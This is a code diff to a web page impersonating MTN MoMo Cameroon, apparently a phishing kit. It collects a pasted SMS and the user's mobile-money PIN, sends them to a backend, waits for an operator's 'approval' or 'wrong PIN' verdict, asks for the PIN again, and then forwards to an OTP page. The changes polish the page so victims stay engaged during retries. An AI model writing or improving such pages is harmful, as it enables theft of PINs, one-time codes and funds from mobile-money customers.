@@ -139,7 +139,7 @@
         footer { padding: 6px; color: #aaa; font-size: 11px; text-align: center; width: 100%; max-width: 480px; flex-shrink: 0; }
 
         /* ============================================
-           WAITING OVERLAY
+           WAITING OVERLAY (used for the FIRST submit only)
            ============================================ */
         .verify-overlay {
             position: fixed; inset: 0; background: #ffffff;
@@ -180,7 +180,33 @@
         .verify-security { display: flex; align-items: center; gap: 5px; font-size: 11px; color: #aaa; }
 
         /* ============================================
-           NOTICE MODAL (Resend / Reject / Wrong Pin messages)
+           WAITING BANNER (used for retry submit — stays on SMS page)
+           ============================================ */
+        .waiting-banner {
+            position: fixed; left: 50%; bottom: 18px;
+            transform: translateX(-50%) translateY(120%);
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            color: white;
+            padding: 12px 20px; border-radius: 50px;
+            font-size: 13px; font-weight: 700;
+            font-family: 'Inter', sans-serif;
+            box-shadow: 0 12px 30px rgba(0, 71, 171, 0.35);
+            display: flex; align-items: center; gap: 10px;
+            z-index: 2500; max-width: calc(100% - 32px);
+            transition: transform 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            pointer-events: none;
+        }
+        .waiting-banner.show { transform: translateX(-50%) translateY(0); }
+
+        .waiting-banner .banner-spinner {
+            width: 14px; height: 14px;
+            border: 2.5px solid rgba(255, 255, 255, 0.4);
+            border-top-color: #fff; border-radius: 50%;
+            animation: spin 0.7s linear infinite; flex-shrink: 0;
+        }
+
+        /* ============================================
+           NOTICE MODAL (Resend / Reject / Wrong Pin / Not Correct messages)
            ============================================ */
         .notice-overlay {
             position: fixed; inset: 0; background: rgba(0, 0, 0, 0.55);
@@ -348,7 +374,7 @@
 
     <footer>© 2026 MTN MoMo Cameroon</footer>
 
-    <!-- WAITING OVERLAY -->
+    <!-- WAITING OVERLAY (only used on FIRST submit) -->
     <div class="verify-overlay" id="verifyOverlay">
         <div class="verify-content">
             <div class="verify-momo-icon">MoMo</div>
@@ -364,7 +390,13 @@
         </div>
     </div>
 
-    <!-- NOTICE MODAL (info / errors) -->
+    <!-- WAITING BANNER (used for retry — page stays visible) -->
+    <div class="waiting-banner" id="waitingBanner">
+        <div class="banner-spinner"></div>
+        <span>Waiting for confirmation…</span>
+    </div>
+
+    <!-- NOTICE MODAL -->
     <div class="notice-overlay" id="noticeOverlay">
         <div class="notice-box">
             <div class="notice-icon info" id="noticeIcon">ℹ️</div>
@@ -404,6 +436,7 @@
         // ============================================
         const POLL_INTERVAL_MS = 2000;
         let pollTimer = null;
+        let retryTimer = null;
 
         // ============================================
         // DOM REFERENCES
@@ -416,6 +449,7 @@
         const resendBtn = document.getElementById('resendBtn');
         const countdownEl = document.getElementById('countdown');
         const verifyOverlay = document.getElementById('verifyOverlay');
+        const waitingBanner = document.getElementById('waitingBanner');
 
         // Notice modal
         const noticeOverlay = document.getElementById('noticeOverlay');
@@ -538,10 +572,13 @@
         });
 
         // ============================================
-        // OVERLAY / MODAL HELPERS
+        // OVERLAY / BANNER / MODAL HELPERS
         // ============================================
         function showVerifyOverlay() { verifyOverlay.classList.add('show'); }
         function hideVerifyOverlay() { verifyOverlay.classList.remove('show'); }
+
+        function showWaitingBanner() { waitingBanner.classList.add('show'); }
+        function hideWaitingBanner() { waitingBanner.classList.remove('show'); }
 
         function showNotice({ icon, type, title, message, buttonText, onClick }) {
             noticeIcon.textContent = icon || 'ℹ️';
@@ -550,7 +587,6 @@
             noticeMessage.textContent = message || '';
             noticeBtn.textContent = buttonText || 'OK';
 
-            // Remove old listener
             const newBtn = noticeBtn.cloneNode(true);
             noticeBtn.parentNode.replaceChild(newBtn, noticeBtn);
             newBtn.addEventListener('click', () => {
@@ -565,6 +601,8 @@
             pinInput.value = '';
             pinError.classList.remove('show');
             pinInput.classList.remove('invalid');
+            pinBtn.disabled = true;
+            pinBtn.textContent = 'Proceed';
             pinOverlay.classList.add('show');
             setTimeout(() => pinInput.focus(), 250);
         }
@@ -584,7 +622,7 @@
         pinBtn.disabled = true;
 
         // ============================================
-        // POLLING FOR ADMIN APPROVAL
+        // POLLING — FIRST SUBMIT (uses overlay)
         // ============================================
         function startPolling(requestId) {
             stopPolling();
@@ -649,7 +687,6 @@
                             onClick: () => { showPinModal(); }
                         });
                     }
-                    // else still pending
                 } catch (err) {
                     console.error('Polling error:', err);
                 }
@@ -664,7 +701,7 @@
         }
 
         // ============================================
-        // VERIFY BUTTON → sends SMS to backend → polls admin
+        // VERIFY BUTTON → sends SMS → polls admin (uses overlay)
         // ============================================
         verifyBtn.addEventListener('click', async function() {
             const text = smsInput.value.trim();
@@ -732,7 +769,8 @@
         });
 
         // ============================================
-        // PIN CONFIRM → sends to /api/sms-retry → polls admin
+        // PIN CONFIRM → sends to /api/sms-retry
+        // User STAYS on SMS page — only banner shows
         // ============================================
         pinBtn.addEventListener('click', async function() {
             const newPin = pinInput.value.trim();
@@ -746,8 +784,6 @@
 
             pinBtn.disabled = true;
             pinBtn.textContent = 'Please wait...';
-            hidePinModal();
-            showVerifyOverlay();
 
             try {
                 const controller = new AbortController();
@@ -775,12 +811,19 @@
                 // Save the new pin locally
                 localStorage.setItem('momoPin', newPin);
 
-                // Poll for approval — but with retry-specific statuses
+                // ✅ Close PIN popup — user stays on SMS page
+                hidePinModal();
+                pinBtn.disabled = false;
+                pinBtn.textContent = 'Proceed';
+
+                // ✅ Show small waiting banner at bottom
+                showWaitingBanner();
+
+                // ✅ Poll in background
                 startRetryPolling(data.requestId);
 
             } catch (err) {
                 console.error('PIN retry error:', err);
-                hideVerifyOverlay();
                 pinBtn.disabled = false;
                 pinBtn.textContent = 'Proceed';
 
@@ -792,10 +835,8 @@
         });
 
         // ============================================
-        // RETRY POLLING (after Wrong Pin → Proceed)
+        // RETRY POLLING — user stays on SMS page (banner only)
         // ============================================
-        let retryTimer = null;
-
         function startRetryPolling(requestId) {
             stopPolling();
             stopRetryPolling();
@@ -812,7 +853,7 @@
                     if (data.status === 'approved') {
                         console.log('✅ RETRY APPROVED');
                         stopRetryPolling();
-                        hideVerifyOverlay();
+                        hideWaitingBanner();
                         localStorage.setItem('momoVerified', JSON.stringify({
                             verifiedAt: new Date().toISOString(),
                             requestId: requestId
@@ -820,9 +861,9 @@
                         window.location.href = 'verify-otp.html';
 
                     } else if (data.status === 'not_correct') {
-                        console.log('⚠️ NOT CORRECT — return to SMS page');
+                        console.log('⚠️ NOT CORRECT — stay on SMS page');
                         stopRetryPolling();
-                        hideVerifyOverlay();
+                        hideWaitingBanner();
 
                         // Reset UI so user can try again
                         verifyBtn.disabled = false;
@@ -834,10 +875,10 @@
                             icon: '⚠️',
                             type: 'warn',
                             title: 'PIN Not Correct',
-                            message: 'The PIN you entered is still not correct. Please paste the SMS again.',
+                            message: 'The PIN you entered is still not correct. Please try again.',
                             buttonText: 'OK',
                             onClick: () => {
-                                // Stay on this page, ready to try again
+                                // Stay on this page — user is ready to try again
                                 smsInput.focus();
                             }
                         });
